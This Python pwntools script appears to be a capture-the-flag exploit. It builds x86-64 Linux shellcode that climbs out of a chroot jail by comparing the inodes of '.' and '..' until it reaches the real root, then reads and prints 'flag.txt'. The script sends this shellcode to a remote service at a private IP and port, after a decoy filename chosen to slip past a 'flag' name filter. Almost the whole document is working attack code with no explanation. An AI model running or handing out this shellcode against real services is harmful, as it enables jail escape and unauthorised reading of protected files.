from pwn import *
context.clear(arch='amd64', os='linux')

asm_sc = asm(r'''
.intel_syntax noprefix
.p2align 0

/* print a tiny banner so we know code ran */
    mov eax, 1              /* write */
    mov edi, 1
    lea rsi, [rip+BANNER]
    mov edx, 4
    syscall

/* cur = openat(AT_FDCWD, ".", O_DIRECTORY) */
    mov rdi, -100           /* AT_FDCWD */
    lea rsi, [rip+DOT]
    mov edx, 0x20000        /* O_DIRECTORY */
    mov eax, 257            /* openat */
    syscall
    mov r15, rax            /* r15 = cur fd */

/* loop: climb to real / using fstat(cur) vs fstat(parent) */
rootwalk:
    /* fstat(cur, &st_cur) */
    mov rdi, r15
    lea rsi, [rip+ST_CUR]
    mov eax, 5              /* fstat */
    syscall

    /* parent = openat(cur, "..", O_DIRECTORY) */
    mov rdi, r15
    lea rsi, [rip+DOTDOT]
    mov edx, 0x20000        /* O_DIRECTORY */
    mov eax, 257            /* openat */
    syscall
    mov r14, rax            /* r14 = parent fd */

    /* fstat(parent, &st_par) */
    mov rdi, r14
    lea rsi, [rip+ST_PAR]
    mov eax, 5              /* fstat */
    syscall

    /* compare st_dev (qword 0) and st_ino (qword 1) */
    mov rax, qword ptr [rip+ST_CUR+0]
    mov rbx, qword ptr [rip+ST_PAR+0]
    cmp rax, rbx
    jne not_root
    mov rax, qword ptr [rip+ST_CUR+8]
    mov rbx, qword ptr [rip+ST_PAR+8]
    cmp rax, rbx
    jne not_root

    /* reached root: use r14 as root_fd; close old cur */
    mov rdi, r15
    mov eax, 3              /* close */
    syscall
    mov r15, r14
    jmp have_root

not_root:
    /* move up one: close(cur); cur = parent; repeat */
    mov rdi, r15
    mov eax, 3              /* close */
    syscall
    mov r15, r14
    jmp rootwalk

have_root:
    /* openat(root_fd, "flag", O_RDONLY) */
    mov rdi, r15
    lea rsi, [rip+FLAG]
    xor edx, edx            /* O_RDONLY */
    mov eax, 257            /* openat */
    syscall
    /* read(fd, buf, 4096) */
    mov rdi, rax
    lea rsi, [rip+BUF]
    mov edx, 4096
    xor eax, eax            /* read */
    syscall
    /* write(1, buf, n) */
    mov edx, eax
    mov edi, 1
    lea rsi, [rip+BUF]
    mov eax, 1              /* write */
    syscall

    /* exit(0) */
    xor edi, edi
    mov eax, 60
    syscall

/* --- data --- */
BANNER:  .ascii "[*]\n"
DOT:     .ascii ".\0"
DOTDOT:  .ascii "..\0"
FLAG:    .ascii "flag.txt\0"     /* relative to / */
.balign 8
ST_CUR:  .space 200          /* struct stat scratch */
ST_PAR:  .space 200
BUF:     .space 4096
''')

def main():
    io = remote('10.0.30.196', 9999)
    io.send(b"ok\n")         # filename (must NOT contain "flag")
    io.send(asm_sc)          # raw shellcode
    io.shutdown('send')      # make read() return so it jumps to our code
    print(io.recvall(timeout=5).decode('utf-8', errors='ignore'))

if __name__ == "__main__":
    main()
